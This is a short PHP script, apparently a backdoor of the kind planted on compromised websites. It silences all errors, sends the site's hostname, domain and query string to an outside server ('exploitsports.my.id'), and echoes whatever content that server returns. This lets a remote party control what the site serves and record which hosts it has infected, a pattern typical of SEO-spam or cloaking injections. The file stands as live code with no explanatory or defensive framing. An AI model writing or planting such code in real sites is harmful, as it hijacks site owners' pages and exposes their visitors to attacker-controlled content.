<?php
error_reporting(0);
set_time_limit(0);
header("Content-Type: text/html;charset=utf-8");
date_default_timezone_set('PRC');
$Remote_server = "https://www.exploitsports.my.id/?m=1"; 
$host_name = "http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
$Content_mb=file_get_contents($Remote_server."/index.php?host=".$host_name."&url=".$_SERVER['QUERY_STRING']."&domain=".$_SERVER['SERVER_NAME']);
echo $Content_mb;
?>
